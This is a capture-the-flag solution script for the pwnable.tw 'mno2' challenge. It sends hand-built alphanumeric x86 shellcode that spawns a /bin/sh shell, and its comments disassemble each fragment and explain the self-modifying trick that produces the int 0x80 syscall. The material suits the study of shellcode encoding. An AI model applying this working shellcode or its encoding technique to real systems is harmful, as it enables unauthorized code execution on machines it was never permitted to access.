from pwn import *

local = False

if local:
	r = process("./mno2")
else:
	# nc chall.pwnable.tw 10301
	r = remote("chall.pwnable.tw", 10301)

push_sh = "P4BhYBPBVVVVV4BaBBBBBBBBRhBBBBhBBBBhBBBBhBBBBhBBBBhBBBBhBBBB4Ba5N18BP"
push_bin = "VV4BhYPP8VVVVV4BaBBBBBBBBRhBBBBhBBBBhBBBBhBBBBhBBBBhBBBBhBBBB4Ba5N29VP"
mov_ebx_esp = "ThBBBBhBBBBhBBBBhBBBBhBBBBhBBBBhBBBB4BaVPPPPPPPP4Ba"
mov_ecx_0 = "4BhBBBBVVSWWWW4Ba5BBBBPY"
int80 = "5MnO2Rf5B2Rf5Y3I1H11H2IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII1H2"
clear_ecx_edx = "4BhBBBBVVSWWWW4Ba5BBBBPPPSPPPP4Ba"
mov_eax_11 = "4249"
end = "2Y"

payload = push_sh + push_bin + mov_ebx_esp + mov_ecx_0 + int80 + clear_ecx_edx + mov_eax_11 + end

r.sendline(payload)
r.interactive()


'''
$ clear the shellcode
1. push_sh = "P4BhYBPBVVVVV4BaBBBBBBBBRhBBBBhBBBBhBBBBhBBBBhBBBBhBBBBhBBBB4Ba5N18BP"
---------------------

0:  50                      push   eax              # the first character should be uppercase character
1:  34 42                   xor    al,0x42          # take "B" (0x42) for "h" (0x68) --> Bh
3:  68 59 42 50 42          push   0x42504259       # should be "push 0x42504261" but start with "a" not allow, so use Y (0x59) and then inc to "a" (0x61)
8:  56                      push   esi
9:  56                      push   esi
a:  56                      push   esi
b:  56                      push   esi
c:  56                      push   esi
d:  34 42                   xor    al,0x42          # prepare "B" (0x42) for "a" (0x61) --> Ba
f:  61                      popa                    # pop edx
10: 42                      inc    edx
11: 42                      inc    edx
12: 42                      inc    edx
13: 42                      inc    edx
14: 42                      inc    edx
15: 42                      inc    edx
16: 42                      inc    edx
17: 42                      inc    edx              # edx now have the value we want 0x42504261 
18: 52                      push   edx              # push edx into stack and the use popa to pop eax
19: 68 42 42 42 42          push   0x42424242
1e: 68 42 42 42 42          push   0x42424242
23: 68 42 42 42 42          push   0x42424242
28: 68 42 42 42 42          push   0x42424242
2d: 68 42 42 42 42          push   0x42424242
32: 68 42 42 42 42          push   0x42424242
37: 68 42 42 42 42          push   0x42424242
3c: 34 42                   xor    al,0x42
3e: 61                      popa                    # eax now have the value we want 0x42504261
3f: 35 4e 31 38 42          xor    eax,0x4238314e   # xor to become "/sh\x00"
44: 50                      push   eax              # push it into stack

-------------------------
2. push_bin = "VV4BhYPP8VVVVV4BaBBBBBBBBRhBBBBhBBBBhBBBBhBBBBhBBBBhBBBBhBBBB4Ba5N29VP"
-------------------------

0:  56                      push   esi              # 
1:  56                      push   esi              # push this two value to take place of eax, ecx ; it won't affact to our "/sh\x00" in stack when popa
2:  34 42                   xor    al,0x42          # Ba
4:  68 59 50 50 38          push   0x38505059       # should be 0x38505061 but can't start with "a" so we use "Y" (0x59), pop to edx and inc dex
9:  56                      push   esi
a:  56                      push   esi
b:  56                      push   esi
c:  56                      push   esi
d:  56                      push   esi
e:  34 42                   xor    al,0x42
10: 61                      popa                    # edx = 0x38505059
11: 42                      inc    edx
12: 42                      inc    edx
13: 42                      inc    edx
14: 42                      inc    edx
15: 42                      inc    edx
16: 42                      inc    edx
17: 42                      inc    edx
18: 42                      inc    edx              # edx = 0x38505061
19: 52                      push   edx              # when popa happen, eax will hold this value 0x38505061
1a: 68 42 42 42 42          push   0x42424242
1f: 68 42 42 42 42          push   0x42424242
24: 68 42 42 42 42          push   0x42424242
29: 68 42 42 42 42          push   0x42424242
2e: 68 42 42 42 42          push   0x42424242
33: 68 42 42 42 42          push   0x42424242
38: 68 42 42 42 42          push   0x42424242
3d: 34 42                   xor    al,0x42
3f: 61                      popa                    # eax = 0x38505061
40: 35 4e 32 39 56          xor    eax,0x5639324e   # eax = "/bin"[::-1].encode("hex")
45: 50                      push   eax              # now stack will have "/bin/sh\x00"

-----------------------------
3. mov_ebx_esp = "ThBBBBhBBBBhBBBBhBBBBhBBBBhBBBBhBBBB4BaVPPPPPPPP4Ba"
----------------------------

0:  54                      push   esp              # push address of "/bin/sh\x00"
1:  68 42 42 42 42          push   0x42424242
6:  68 42 42 42 42          push   0x42424242
b:  68 42 42 42 42          push   0x42424242
10: 68 42 42 42 42          push   0x42424242
15: 68 42 42 42 42          push   0x42424242
1a: 68 42 42 42 42          push   0x42424242
1f: 68 42 42 42 42          push   0x42424242
24: 34 42                   xor    al,0x42
26: 61                      popa                    # eax hold the address of "/bin/sh\x00"
27: 56                      push   esi                   # we can't use popa 1 time: pop esp; ...; popa
28: 50                      push   eax                   # because esp will lower than "/bin/sh\x00"
29: 50                      push   eax                   # and if the next time we use stack to push value
2a: 50                      push   eax                   # our "/bin/sh\x00" will be touched
2b: 50                      push   eax                        # so we use popa two time
2c: 50                      push   eax                        # first: pop into eax
2d: 50                      push   eax                        # second: pop into ebx
2e: 50                      push   eax
2f: 50                      push   eax
30: 34 42                   xor    al,0x42
32: 61                      popa                    # ebx now have address of "/bin/sh\x00"

--------------------------------
4. mov_ecx_0 = "4BhBBBBVVSWWWW4Ba5BBBBPY"
--------------------------------

0:  34 42                   xor    al,0x42          # Bh
2:  68 42 42 42 42          push   0x42424242
7:  56                      push   esi
8:  56                      push   esi
9:  53                      push   ebx
a:  57                      push   edi
b:  57                      push   edi
c:  57                      push   edi
d:  57                      push   edi
e:  34 42                   xor    al,0x42
10: 61                      popa                    # eax = 0x42424242
11: 35 42 42 42 42          xor    eax,0x42424242   # eax = 0
16: 50                      push   eax             
17: 59                      pop    ecx              # ecx = 0

--------------------------------
5. int80 = "5MnO2Rf5B2Rf5Y3I1H11H2IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII1H2"
--------------------------------

0:  35 4d 6e 4f 32          xor    eax,0x324f6e4d               # eax hold address of our shellcode
5:  52                      push   edx                          # Rf
6:  66 35 42 32             xor    ax,0x3242                       # our shellcode is long so it affect two byte of addr
a:  52                      push   edx                             # we need to xor 2_TIMEs because (start) ^ (start+len-2-0x31) = unacceptable_character 
b:  66 35 59 33             xor    ax,0x3359                       # unacceptable_character = 0x3234 ^ 0x3359
f:  49                      dec    ecx                          # ecx = 0xffffffff
10: 31 48 31                xor    DWORD PTR [eax+0x31],ecx     # 0xcd = 0xff ^ 0x32. Here we use DWORD (0X31) because BYTE (0x30) "0" not acceptable
13: 31 48 32                xor    DWORD PTR [eax+0x32],ecx     # (0xff ^ 0x59) ^ 0xff
16: 49                      dec    ecx
17: 49                      dec    ecx
18: 49                      dec    ecx
19: 49                      dec    ecx
1a: 49                      dec    ecx
1b: 49                      dec    ecx
1c: 49                      dec    ecx
1d: 49                      dec    ecx
1e: 49                      dec    ecx
1f: 49                      dec    ecx
20: 49                      dec    ecx
21: 49                      dec    ecx
22: 49                      dec    ecx
23: 49                      dec    ecx
24: 49                      dec    ecx
25: 49                      dec    ecx
26: 49                      dec    ecx
27: 49                      dec    ecx
28: 49                      dec    ecx
29: 49                      dec    ecx
2a: 49                      dec    ecx
2b: 49                      dec    ecx
2c: 49                      dec    ecx
2d: 49                      dec    ecx
2e: 49                      dec    ecx
2f: 49                      dec    ecx
30: 49                      dec    ecx
31: 49                      dec    ecx
32: 49                      dec    ecx
33: 49                      dec    ecx
34: 49                      dec    ecx
35: 49                      dec    ecx
36: 49                      dec    ecx
37: 49                      dec    ecx
38: 49                      dec    ecx
39: 49                      dec    ecx
3a: 49                      dec    ecx
3b: 49                      dec    ecx                          # ecx = 0xffffffd9
3c: 31 48 32                xor    DWORD PTR [eax+0x32],ecx     # 0x59 ^ 0xd9 = 0x80

-------------------------------
6. clear_ecx_edx = "4BhBBBBVVSWWWW4Ba5BBBBPPPSPPPP4Ba"
-------------------------------

0:  34 42                   xor    al,0x42
2:  68 42 42 42 42          push   0x42424242
7:  56                      push   esi
8:  56                      push   esi
9:  53                      push   ebx
a:  57                      push   edi
b:  57                      push   edi
c:  57                      push   edi
d:  57                      push   edi
e:  34 42                   xor    al,0x42
10: 61                      popa                        # eax = 0x42424242
11: 35 42 42 42 42          xor    eax,0x42424242       # eax = 0
16: 50                      push   eax
17: 50                      push   eax                  # room for ecx when popa
18: 50                      push   eax                  # room for edx when popa
19: 53                      push   ebx                  # remain ebx
1a: 50                      push   eax
1b: 50                      push   eax
1c: 50                      push   eax
1d: 50                      push   eax
1e: 34 42                   xor    al,0x42
20: 61                      popa                        # now ecx = edx = 0

---------------------------------
7. mov_eax_11 = "4249"
---------------------------------

0:  34 32                   xor    al,0x32
2:  34 39                   xor    al,0x39              # 0x32 ^ 0x39 = 0xb

---------------------------------
8. end = "2Y"               # room for "\xcd\x80"  

'''


'''
$ Material:

xor al, xx
xor ax, xxxx
xor eax, xxxxxxxx

push xxxxxxxx       x (h)

push esp

pop eax             x (popa instead)
push eax            
push ebx
pop ecx
pop edx             x (popa instead)
push edx            x (R -> rh -> use push xxxxxxxx after that)
push esi
push edi

popa                x pop edi, esi, ebp, esp, ebx, edx, ecx, eax

dec eax             NOT_USE
inc ecx             x and NOT_USE
dec ecx             use to make "\xcd\x80"
inc edx             IMPORTANT because it can increase value

xor    DWORD PTR [eax+0x32],ecx

'''

'''
$ Difficult:
1. xor ax, xxxx: 0x66 ("f") for xor, require 0x52 ("R") 
2. xor 2 times to get the value we want
3. xor BYTE: 0x30, xor DWORD: 0x31 
'''
